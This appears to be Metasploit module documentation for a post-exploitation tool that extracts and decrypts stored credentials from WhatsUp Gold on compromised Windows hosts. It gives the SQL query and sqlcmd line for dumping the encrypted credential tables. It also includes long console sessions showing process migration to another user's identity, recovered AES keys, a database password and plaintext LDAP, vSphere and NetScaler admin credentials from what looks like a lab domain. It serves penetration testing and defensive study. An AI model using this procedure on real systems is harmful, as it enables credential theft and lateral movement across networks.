## Vulnerable Application

This module exports and decrypts credentials from WhatsUp Gold to a CSV file; it is intended as a
post-exploitation module for Windows hosts with WhatsUp Gold installed. The module has been tested
on and can successfully decrypt credentials from WhatsUp versions 11.0 to the latest (22.x).
Extracted credentials are automatically added to loot.

## Actions

### Dump

`dump` is the default action and performs extraction of the WhatsUp Gold database parameters and
encryption keys. This action also exports WhatsUp Gold SQL data and immediately decrypts it. `dump`
is suitable when the following conditions are met:

1. The sqlcmd binary is available on the target system
2. The machine account has access to the WhatsUp Gold database (if Windows Integrated) or WhatsUp
   Gold is using SQL native auth

### Export

`export` performs SQL data extraction of the encrypted data as a CSV file; use this option if it is
necessary to migrate the Meterpreter session to a new non-SYSTEM identity in order to access the SQL
database. Invoking the `export` action requires the Meterpreter session to be running in the context
of a user that has access to the configured WhatsUp Gold SQL database.

### Decrypt

`decrypt` performs decryption of encrypted WhatsUp Gold SQL data. To invoke the `decrypt` action, you
must also set the `CSV_FILE` advanced option or the `MSSQL_INSTANCE` and `MSSQL_DB` options. See
`SQL Data Acquisition` below for more information.

## Verification Steps

1. Start msfconsole
2. Get session on host via method of choice and background it
3. Do: `use post/windows/gather/credentials/whatsupgold_credential_dump`
4. Do: `set session <session>`
5. Do: `dump` to extract and decrypt the WhatsUp Gold database, or `export` to extract the encrypted database only

If `dump` or `export` fail, the session identity may need permission to log in to SQL; see `Scenarios`.

## Advanced Options

### AES_SALT

WhatsUp Gold modern (type 3) encryption generates an AES256 key based on SHA-256 hash of the
product serial number as stored in the system registry. This option allows the operator to provide
the WhatsUp serial number rather than attempt to extract it from the registry.

### CSV_FILE

Path to a CSV file that contains the encrypted WhatsUp Gold database data that has been previously
exported. Provide this option when invoking offline decryption using the `decrypt` action.

### MSSQL_DB

The MSSQL database name used by WhatsUp Gold, specified in the `INITIAL CATALOG` as extracted
from the database parameters. Provide this option when invoking the `export` action.

### MSSQL_INSTANCE

The path to the MSSQL instance used by WhatsUp Gold, specified in the `DATA SOURCE` as extracted
from the database parameters. Provide this option when invoking the `export` action.

## Scenarios

### SQL Data Acquisition

The sqlcmd binaries (part of the SQL Server Management Studio) must be installed on the system
to access the database. WhatsUp Gold does not install SSMS or sqlcmd by default if it is not also
installing a local SQL server instance - in such cases, it will be necessary to extract the
encrypted database manually and provide the module with a path to the extracted data. To do so
execute the SQL query below against the WhatsUp Gold database and save the resulting row set as a CSV file.

The CSV header must match:

`nCredentialTypeID,DisplayName,Description,Username,Password,Method`

Columns are cast `VARBINARY` to deal with poor CSV export support in `sqlcmd`. Export the results of
the query below to CSV file:

```
SET NOCOUNT ON;
SELECT
  ct.nCredentialTypeID nCredentialTypeID,
  CONVERT(VARBINARY(1024),ct.sDisplayName) DisplayName,
  CONVERT(VARBINARY(1024),ct.sDescription) Description,
  CONVERT(VARBINARY(1024),ctd.sName) Username,
  CONVERT(VARBINARY(4096),ctd.sValue) Password
FROM
  [dbo].[CredentialType] AS ct
JOIN
  [dbo].[CredentialTypeData] AS ctd ON(ct.nCredentialTypeID=ctd.nCredentialTypeID)
WHERE
  ctd.sValue IS NOT NULL AND ctd.sValue NOT LIKE ''
```

Output must be encoded VARBINARY per above, and must be well-formed CSV (i.e. no trailing whitespace).
If using `sqlcmd`, ensure the `-W` and `-I` parameters are included to strip trailing whitespace and
allow quoted identifiers. Suggested syntax for `sqlcmd` using Windows authentication is below, where
the contents of `solarwinds_sql_query.sql` is the text of the SQL query above:

`sqlcmd -d "<DBNAME>" -S <MSSQL_INSTANCE> -E -i sql_query.sql -o wug_dump.csv -h-1 -s"," -w 65535 -W -I`

This should place a CSV export file suitable for use within the module at `wug_dump.csv`. If
using SQL native auth, replace the `-E` parameter with

`-U "<MSSQL_USER>" -P "<MSSQL_PASS>"`

### Examples

Windows Server 2019 host running WhatsUp Gold Build 22.1.39 with external database
and SQL native authentication using the `dump` action:

```
msf6 exploit(multi/handler) > use post/windows/gather/credentials/whatsupgold_credential_dump
msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > set session 1
session => 1
msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > dump

[*] Hostname WUG IPv4 192.168.101.137
[*] WhatsUp Gold Build 22.1.39
[*] Init WhatsUp Gold crypto ...
[+] WhatsUp Gold Serial Number: 52CXF233MXGRDVB
[+] WhatsUp Gold Dynamic Encryption Salt
[+]     HEX: E9143AD84940A233
[+] WhatsUp Gold Composed AES256
[+]     KEY: 5B83224E3BFB363C841C6E27B6DF6B824ECD67BA06B4ED1918C0F738A60A8A75
[+]      IV: 5205DF3A92F346215308DD91DEAF69AE
[*] Init WhatsUp Gold SQL ...
[+] SolarWinds WhatsUp Gold SQL Database Connection Configuration:
[+]     Instance Name: cornflakes.cesium137.io
[+]     Database Name: WhatsUp
[+]     Database User: WhatsUpGold_WUG
[+]     Database Pass: KB4A5bERZ13o6GGF3kON3z6mx5
[*] Performing export of WhatsUp Gold SQL database to CSV file
[*] Export WhatsUp Gold DB ...
[+] 11 WUG rows exported, 4 unique nCredentialTypeIDs
[+] Encrypted WhatsUp Gold Database Dump: /root/.msf4/loot/20221218103644_default_192.168.101.137_whatsup_gold_enc_233587.txt
[*] Performing decryption of WhatsUp Gold SQL database
[+] 11 WUG rows loaded, 4 unique nCredentialTypeIDs
[*] Process WhatsUp Gold DB ...
[+] 11 WUG rows processed
[*] 11 rows recovered: 7 plaintext, 4 decrypted (0 blank)
[*] 11 rows written (0 blank rows withheld)
[+] 4 unique WUG nCredentialTypeID records recovered
[+] Recovered Credential: LDAP bind account
[+]     L: CESIUM137\ldap
[+]     P: WuddidUSay2Me?!
[+] Recovered Credential: vSphere SSO Admin
[+]     L: Administrator@vSphere.local
[+]     P: IAmOut2Lunch!
[+] Recovered Credential: NetScaler root
[+]     L: nsroot
[+]     P: quit2day!
[+] Decrypted WhatsUp Gold Database Dump: /root/.msf4/loot/20221218103644_default_192.168.101.137_whatsup_gold_dec_398808.txt
[*] Post module execution completed
msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > 
```

Windows Server 2019 with MSSQL SSPI authentication configured for SQL database -
migrate the session PID to an identity with permission to log on to the SQL server
before executing the `dump` action:

```
msf6 exploit(multi/handler) > use post/windows/gather/credentials/whatsupgold_credential_dump
msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > set session 1
session => 1
msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > dump

[*] Hostname WINNEBAGO IPv4 192.168.101.125
[*] WhatsUp Gold Build 22.1.39
[*] Init WhatsUp Gold crypto ...
[+] WhatsUp Gold Serial Number: 52CXF233MXGRDVB
[+] WhatsUp Gold Dynamic Encryption Salt
[+]     HEX: E9143AD84940A233
[+] WhatsUp Gold Composed AES256
[+]     KEY: 5B83224E3BFB363C841C6E27B6DF6B824ECD67BA06B4ED1918C0F738A60A8A75
[+]      IV: 5205DF3A92F346215308DD91DEAF69AE
[*] Init WhatsUp Gold SQL ...
[+] SolarWinds WhatsUp Gold SQL Database Connection Configuration:
[+]     Instance Name: WINNEBAGO\WHATSUP
[+]     Database Name: WhatsUp
[+]     Database User: (Windows Integrated)
[!] The database uses Windows authentication
[!] Session identity must have access to the SQL server instance to proceed
[*] Performing export of WhatsUp Gold SQL database to CSV file
[*] Export WhatsUp Gold DB ...
[-] Post aborted due to failure: unknown: Sqlcmd: Error: Microsoft ODBC Driver 13 for SQL Server : Login failed for user 'CESIUM137\WINNEBAGO$'..
Sqlcmd: Error: Microsoft ODBC Driver 13 for SQL Server : Cannot open database "WhatsUp" requested by the login. The login failed..
[*] Post module execution completed
msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > ps

Process List
============

 PID   PPID  Name                          Arch  Session  User                             Path
 ---   ----  ----                          ----  -------  ----                             ----
 0     0     [System Process]
 4     0     System                        x64   0
 [...]
 7908  1216  cmd.exe                       x64   1        CESIUM137\teenysupguy            C:\Windows\System32\cmd.exe
 [...]
meterpreter > migrate 7908
[*] Migrating from 2536 to 7908...
[*] Migration completed successfully.
meterpreter > bg
[*] Backgrounding session 1...
msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > dump

[*] Hostname WINNEBAGO IPv4 192.168.101.125
[*] WhatsUp Gold Build 22.1.39
[*] Init WhatsUp Gold crypto ...
[+] WhatsUp Gold Serial Number: 52CXF233MXGRDVB
[+] WhatsUp Gold Dynamic Encryption Salt
[+]     HEX: E9143AD84940A233
[+] WhatsUp Gold Composed AES256
[+]     KEY: 5B83224E3BFB363C841C6E27B6DF6B824ECD67BA06B4ED1918C0F738A60A8A75
[+]      IV: 5205DF3A92F346215308DD91DEAF69AE
[*] Init WhatsUp Gold SQL ...
[+] SolarWinds WhatsUp Gold SQL Database Connection Configuration:
[+]     Instance Name: WINNEBAGO\WHATSUP
[+]     Database Name: WhatsUp
[+]     Database User: (Windows Integrated)
[!] The database uses Windows authentication
[!] Session identity must have access to the SQL server instance to proceed
[*] Performing export of WhatsUp Gold SQL database to CSV file
[*] Export WhatsUp Gold DB ...
[+] 9 WUG rows exported, 4 unique nCredentialTypeIDs
[+] Encrypted WhatsUp Gold Database Dump: /root/.msf4/loot/20221218104026_default_192.168.101.125_whatsup_gold_enc_241327.txt
[*] Performing decryption of WhatsUp Gold SQL database
[+] 9 WUG rows loaded, 4 unique nCredentialTypeIDs
[*] Process WhatsUp Gold DB ...
[+] 9 WUG rows processed
[*] 9 rows recovered: 6 plaintext, 3 decrypted (0 blank)
[*] 9 rows written (0 blank rows withheld)
[+] 4 unique WUG nCredentialTypeID records recovered
[+] Recovered Credential: ldap
[+]     L: CESIUM137\ldap
[+]     P: WuddidUSay2Me?!
[+] Recovered Credential: vSphere SSO Admin
[+]     L: Administrator@vSphere.local
[+]     P: IAmOut2Lunch!
[+] Recovered Credential: nsroot
[+]     L: nsroot
[+]     P: quit2day!
[+] Decrypted WhatsUp Gold Database Dump: /root/.msf4/loot/20221218104026_default_192.168.101.125_whatsup_gold_dec_104164.txt
[*] Post module execution completed
msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > 
```

Host running Windows Server 2003 R2 and WhatsUp Premium 11.0.1.11231 with MSDE;
the operator must supply the export data via the `CSV_FILE` advanced option:

```
msf6 exploit(multi/handler) > use post/windows/gather/credentials/whatsupgold_credential_dump
msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > set session 1
session => 1
msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > dump

[*] Hostname WINCEMEAT IPv4 192.168.101.144
[*] WhatsUp Gold Build 11.00.0004
[*] Init WhatsUp Gold crypto ...
[!] Could not extract dynamic encryption salt; type 3 ciphertext will not be decrypted
[*] Init WhatsUp Gold SQL ...
[+] WhatsUp Gold SQL Database Connection Configuration:
[+]     Instance Name: WINTESSENCE\WHATSUP
[+]     Database Name: WhatsUp
[+]     Database User: (Windows Integrated)
[!] The database uses Windows authentication
[!] Session identity must have access to the SQL server instance to proceed
[-] Post aborted due to failure: bad-config: Unable to identify sqlcmd SQL client on target host
[*] Post module execution completed
msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > 
```

The operator extracts the SQL data from the database into `/tmp/wug_dump.csv` out of band.

```
msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > set CSV_FILE /tmp/wug_dump.csv
CSV_FILE => /tmp/wug_dump.csv
msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > decrypt

[*] Hostname WINCEMEAT IPv4 192.168.101.144
[*] WhatsUp Gold Build 11.00.0004
[*] Init WhatsUp Gold crypto ...
[!] Could not extract dynamic encryption salt; type 3 ciphertext will not be decrypted
[*] Performing decryption of WhatsUp Gold SQL database
[+] 2 WUG rows loaded, 1 unique nCredentialTypeIDs
[*] Process WhatsUp Gold DB ...
[+] 2 WUG rows processed
[*] 2 rows recovered: 1 plaintext, 1 decrypted (0 blank)
[*] 2 rows written (0 blank rows withheld)
[+] 1 unique WUG nCredentialTypeID records recovered
[+] Recovered Credential: LDAP Bind
[+]     L: CESIUM137\ldap
[+]     P: WuddidUSay2Me?!
[+] Decrypted WhatsUp Gold Database Dump: /root/.msf4/loot/20221219112059_default_192.168.101.144_whatsup_gold_dec_615423.txt
[*] Post module execution completed
msf6 post(windows/gather/credentials/whatsupgold_credential_dump) >
```
